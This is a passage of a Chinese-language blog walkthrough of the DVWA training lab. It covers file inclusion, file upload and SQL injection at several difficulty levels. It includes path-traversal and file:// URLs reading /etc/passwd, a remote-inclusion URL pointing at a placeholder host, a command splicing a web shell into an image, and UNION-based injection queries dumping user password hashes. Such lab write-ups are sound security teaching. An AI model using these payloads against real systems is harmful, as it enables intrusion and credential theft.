invoke__">execute</span>();<br><br>    <span class="hljs-comment">// Do both new passwords match and does the current password match the user?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &amp;&amp; ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) ) &#123;<br>        <span class="hljs-comment">// It does!</span><br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database with new password</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_new</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>直接要求验证原密码+token验证，攻击者不知道原密码就没法子csrf。</p>
+<h1 id="五、file-inclusion（文件包含）"><a href="#五、file-inclusion（文件包含）" class="headerlink" title="五、file inclusion（文件包含）"></a>五、file inclusion（文件包含）</h1><p>文件包含介绍：</p>
+<blockquote>
+<p><strong>文件包含</strong></p>
+<p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
+<p><strong>漏洞产生原因</strong></p>
+<p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+</blockquote>
+<p>界面：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630141520524.png" srcset="/img/loading.gif" lazyload alt="image-20210630141520524"></p>
+<p>有三个文件。</p>
+<p>File1:用户名、ip</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142212280.png" srcset="/img/loading.gif" lazyload alt="image-20210630142212280"></p>
+<p>File2:</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142309828.png" srcset="/img/loading.gif" lazyload alt="image-20210630142309828"></p>
+<p>File3:存在很多敏感信息。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142350352.png" srcset="/img/loading.gif" lazyload alt="image-20210630142350352"></p>
+<p>File4:隐藏文件。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630144247278.png" srcset="/img/loading.gif" lazyload alt="image-20210630144247278"></p>
+<h2 id="1-low-3"><a href="#1-low-3" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630142723198.png" srcset="/img/loading.gif" lazyload alt="image-20210630142723198"></p>
+<p>url：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi/?page=include.php<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi/?page=file1.php<br></code></pre></td></tr></table></figure>
+
+<p>源码很简单，直接get指定的文件名赋值给file，没有任何防护。</p>
+<p>尝试访问passwd文件，也是可行的。（访问敏感信息）</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630144703536.png" srcset="/img/loading.gif" lazyload alt="image-20210630144703536"></p>
+<p>甚至可以远程包含。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=http:/</span><span class="hljs-regexp">/xx.xx.xx.xx/</span><span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-medium-3"><a href="#2-medium-3" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630153408797.png" srcset="/img/loading.gif" lazyload alt="image-20210630153408797"></p>
+<p>http:&#x2F;&#x2F;和https:&#x2F;&#x2F; 被str_replace过滤。</p>
+<p>..&#x2F;和..\也被过滤。</p>
+<p>但str_replace只能过滤一次，所以可以使用双写绕过。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630154941333.png" srcset="/img/loading.gif" lazyload alt="image-20210630154941333"></p>
+<p>本地文件&#x2F;etc&#x2F;passwd仍旧可以访问。</p>
+<h2 id="3-high-3"><a href="#3-high-3" class="headerlink" title="3.high"></a>3.high</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630155430279.png" srcset="/img/loading.gif" lazyload alt="image-20210630155430279"></p>
+<p>fnmatch（）函数是根据指定的模式来匹配文件名和字符串。</p>
+<p>意思是必须file开头的文件和include.php。</p>
+<p>也就意味着可以使用file:&#x2F;&#x2F;协议（关于<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">php伪协议</a>）。</p>
+<p>例如：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=file:/</span><span class="hljs-regexp">//</span>etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630162308195.png" srcset="/img/loading.gif" lazyload alt="image-20210630162308195"></p>
+<p>但file协议无法支持远程文件执行，只可以进行本地文件读取。</p>
+<h2 id="4-impossible-3"><a href="#4-impossible-3" class="headerlink" title="4.impossible"></a>4.impossible</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630163051152.png" srcset="/img/loading.gif" lazyload alt="image-20210630163051152"></p>
+<p>直接限制文件，只能是include.php、file1-3.php。</p>
+<h1 id="六、file-upload（文件上传）"><a href="#六、file-upload（文件上传）" class="headerlink" title="六、file upload（文件上传）"></a>六、file upload（文件上传）</h1><h2 id="1-low-4"><a href="#1-low-4" class="headerlink" title="1.low"></a>1.low</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630170841603.png" srcset="/img/loading.gif" lazyload alt="image-20210630170841603"></p>
+<p>没有任何过滤机制。</p>
+<p>尝试上传文件，成功。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630170815030.png" srcset="/img/loading.gif" lazyload alt="image-20210630170815030"></p>
+<h2 id="2-medium-4"><a href="#2-medium-4" class="headerlink" title="2.medium"></a>2.medium</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630171124024.png" srcset="/img/loading.gif" lazyload alt="image-20210630171124024"></p>
+<p>会检查文件的类型，只有<strong>content-type</strong>为image&#x2F;jpeg和image&#x2F;png会成功上传，并且大小要小于100000。</p>
+<p>但对文件的后缀和内容完全没有检测。</p>
+<p>上传php文件，抓包，修改content-type为白名单的类型名。</p>
+<p>显示上传成功。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630171633004.png" srcset="/img/loading.gif" lazyload alt="image-20210630171633004"></p>
+<p>访问一下，可以正常访问。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630172124237.png" srcset="/img/loading.gif" lazyload alt="image-20210630172124237"></p>
+<h2 id="3-high-4"><a href="#3-high-4" class="headerlink" title="3.high"></a>3.high</h2><p>源码：</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210630172245715.png" srcset="/img/loading.gif" lazyload alt="image-20210630172245715"></p>
+<p>strrpos（）返回指定字符最后一次出现的位置。</p>
+<p>以文件名最后一个点切割文件名，检测文件名后缀是否为<strong>jpg</strong>或<strong>jpeg</strong>或<strong>png</strong>。</p>
+<p>看到这个我第一反应就是00截断。</p>
+<p>尝试着上传了一个命名为1.jpg但内容为111的文件，显示上传失败。上传普通的图片却可以成功。</p>
+<p>仔细看了下，原来是有<strong>getimagesize（）</strong>，该函数会检查图片的类型大小。</p>
+<p>所以使用copy拼接马与图片。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy /<span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">a</span>.jpg+<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.php</span> c.jpg<br></code></pre></td></tr></table></figure>
+
+<p>而00截断也因为php实验版本环境过高而无法展开，所以直接上传jpg文件，使用。</p>
+<p>file uoload的high等级并没有限制file:&#x2F;&#x2F;协议，所以文件引用后用菜刀或蚁剑对其进行连接。</p>
+<h2 id="4-impossible-4"><a href="#4-impossible-4" class="headerlink" title="4.impossible"></a>4.impossible</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"><br>&lt;?php<br><br>if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;<br>    // Check Anti-CSRF token<br>    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );<br><br><br>    // File information<br>    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];<br>    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);<br>    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];<br>    $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];<br>    $uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];<br><br>    // Where are we going to be writing to?<br>    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;;<br>    //$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;<br>    $target_file   =  md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;<br>    $temp_file     = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) );<br>    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;<br><br>    // Is it an image?<br>    if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp;<br>        ( $uploaded_size &lt; 100000 ) &amp;&amp;<br>        ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp;<br>        getimagesize( $uploaded_tmp ) ) &#123;<br><br>        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)<br>        if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123;<br>            $img = imagecreatefromjpeg( $uploaded_tmp );<br>            imagejpeg( $img, $temp_file, 100);<br>        &#125;<br>        else &#123;<br>            $img = imagecreatefrompng( $uploaded_tmp );<br>            imagepng( $img, $temp_file, 9);<br>        &#125;<br>        imagedestroy( $img );<br><br>        // Can we move the file to the web root from the temp folder?<br>        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;<br>            // Yes!<br>            echo &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;<br>        &#125;<br>        else &#123;<br>            // No<br>            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;<br>        &#125;<br><br>        // Delete any temp files<br>        if( file_exists( $temp_file ) )<br>            unlink( $temp_file );<br>    &#125;<br>    else &#123;<br>        // Invalid file<br>        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>// Generate Anti-CSRF token<br>generateSessionToken();<br><br>?&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>token用于防御csrf。</p>
+<p>防范非常严密，上传后的文件会被验证、重建还会被改名，然后再提交。</p>
+<blockquote>
+<p>函数uniqid （）：基于以微秒计的当前时间，生成一个唯一的ID</p>
+<p>函数ini_get （）：报道查看函数相应选项对话</p>
+<p>函数sys_get_temp_dir （）：用于报道查看临时文件的目录</p>
+<p>函数imagecreatefromjpeg （文件名）：函数返回图片文件的图像标识，失败返回错误的</p>
+<p>函数imagejpeg （图像，文件名，质量）：从图像图像以文件名为文件名创建一个JPEG图像，可选参数质量，范围从0（最差质量，文件更小）到100（最佳质量，文件最大）。</p>
+<p>函数imagedestroy （）：函数销毁图像资源</p>
+<p>函数rename （）：重命名文件或目录</p>
+<p>函数getcwd （）：获取当前工作目录</p>
+</blockquote>
+<h1 id="七、SQL-Injection（sql注入）"><a href="#七、SQL-Injection（sql注入）" class="headerlink" title="七、SQL Injection（sql注入）"></a>七、SQL Injection（sql注入）</h1><h2 id="1-low-5"><a href="#1-low-5" class="headerlink" title="1.low"></a>1.low</h2><p>界面：一个输入框</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210701145031198.png" srcset="/img/loading.gif" lazyload alt="image-20210701145031198"></p>
+<p>源码：</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210701145723133.png" srcset="/img/loading.gif" lazyload alt="image-20210701145723133" style="zoom:50%;" />
+
+<p>get输入的id的值，然后将id在数据库查询，查询后输出first name和last name。</p>
+<p>过程中并没有对输入查询的id值进行任何的检测和过滤。</p>
+<p>按照步骤进行sql注入。</p>
+<p><strong>1.判断注入类型</strong></p>
+<p><code>1 and 1=1#</code>和<code>1 and 1=2#</code>都有正常的回显，所以并不是数字型，</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702104752146.png" srcset="/img/loading.gif" lazyload alt="image-20210702104752146"></p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702104808518.png" srcset="/img/loading.gif" lazyload alt="image-20210702104808518"></p>
+<p><code>1&#39; and &#39;1&#39;=&#39;1</code>  有正常回显。 <code>1&#39; and &#39;1&#39;=&#39;2</code>无回显。</p>
+<p>所以是<strong>字符型</strong>。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105150396.png" srcset="/img/loading.gif" lazyload alt="image-20210702105150396"></p>
+<p>【<code>1&#39; and &#39;1&#39;=&#39;2</code>无回显⬇️】</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105459200.png" srcset="/img/loading.gif" lazyload alt="image-20210702105459200"></p>
+<p><strong>2.判断列数</strong></p>
+<p>运用<strong>order by</strong>判断列数。</p>
+<p>（order by语句用于根据指定的列对结果集进行排序）</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702105951083.png" srcset="/img/loading.gif" lazyload alt="image-20210702105951083"></p>
+<p>order by到3就报错了，所以列数为3。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702110313691.png" srcset="/img/loading.gif" lazyload alt="image-20210702110313691"></p>
+<p><strong>3.判断回显位置</strong></p>
+<p>使用<strong>union</strong>联合查询，<strong>select</strong>语句进行判断回显位置。</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702110750153.png" srcset="/img/loading.gif" lazyload alt="image-20210702110750153"></p>
+<p>1回显在first name，2回显在surname上。</p>
+<p>**4.**数据库名</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702111319538.png" srcset="/img/loading.gif" lazyload alt="image-20210702111319538"></p>
+<p>数据库名为dvwa。</p>
+<p><strong>5.表名</strong></p>
+<p>group_concat（），将多个字符串连在一起。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702111909275.png" srcset="/img/loading.gif" lazyload alt="image-20210702111909275"></p>
+<p>表有两个：guestbook，users</p>
+<p><strong>6.列名</strong></p>
+<p>查询方式和查表名方式相同。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702113607946.png" srcset="/img/loading.gif" lazyload alt="image-20210702113607946"></p>
+<p>列名：user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>
+<p><strong>7.数据</strong></p>
+<p>查看用户和密码。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702114209072.png" srcset="/img/loading.gif" lazyload alt="image-20210702114209072"></p>
+<p>密码用md5加密过，所以去md5解密网站（例如<a target="_blank" rel="noopener" href="https://www.cmd5.com/">cmd5</a>）进行解密即可得到admin的密码。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702114325809.png" srcset="/img/loading.gif" lazyload alt="image-20210702114325809"></p>
+<h2 id="2-medium-5"><a href="#2-medium-5" class="headerlink" title="2.medium"></a>2.medium</h2><p>界面：无输入框，只能选择。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20210702142548059.png" srcset="/img/loading.gif" lazyload alt="image-20210702142548059"></p>
+<p>url：提交后url无显示（post提交）</p>
+<p>源码：错误后回显示错误信息。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702143231925.png" srcset="/img/loading.gif" lazyload alt="image-20210702143231925"></p>
+<p>可以看出确实是post提交。</p>
+<p>用bp抓一下包，知道了提交的数据格式。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702144128734.png" srcset="/img/loading.gif" lazyload alt="image-20210702144128734"></p>
+<p>可以选择用hackbar，也可以用bp进行接下来的操作。</p>
+<p><strong>1.注入类型判断</strong></p>
+<p>1 and 1&#x3D;1回显正常，1 and 1&#x3D;2回显错误。</p>
+<p>数字型注入。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145305587.png" srcset="/img/loading.gif" lazyload alt="image-20210702145305587"></p>
+<p><strong>2.判断列数</strong></p>
+<p>order by 到3报错，所以列数为2.</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145441034.png" srcset="/img/loading.gif" lazyload alt="image-20210702145441034"></p>
+<p><strong>3.判断回显位置</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145558230.png" srcset="/img/loading.gif" lazyload alt="image-20210702145558230"></p>
+<p><strong>4.数据库名</strong></p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">id=<span class="hljs-number">1</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702145833451.png" srcset="/img/loading.gif" lazyload alt="image-20210702145833451"></p>
+<p><strong>5.列表名</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702151014456.png" srcset="/img/loading.gif" lazyload alt="image-20210702151014456"></p>
+<p>gustbook和users两个表。</p>
+<p><strong>6.查询字段</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>显示报错，报错信息如下。</p>
+<blockquote>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">&#x27;\&#x27;users\&#x27;&#x27;</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>单引号被转义了，<code>&#39;</code>变成了<code>\&#39;</code>。</p>
+<p>把字符串user转换为十六进制进行绕过。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x7573657273</span>#<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702155816655.png" srcset="/img/loading.gif" lazyload alt="image-20210702155816655"></p>
+<p><strong>7.查询数据</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702160231683.png" srcset="/img/loading.gif" lazyload alt="image-20210702160231683"></p>
+<h2 id="3-high-5"><a href="#3-high-5" class="headerlink" title="3.high"></a>3.high</h2><p>界面：点击连接后弹窗。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702162231237.png" srcset="/img/loading.gif" lazyload alt="image-20210702162231237"></p>
+<p>源码：错误后显示something went wrong。实际上和medium的源码并没有太大的差别。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/image-20210702162343418.png" srcset="/img/loading.gif" lazyload alt="image-20210702162343418"></p>
+<p><strong>1.判断注入类型</strong></p>
+<p>字符型注入。</p>
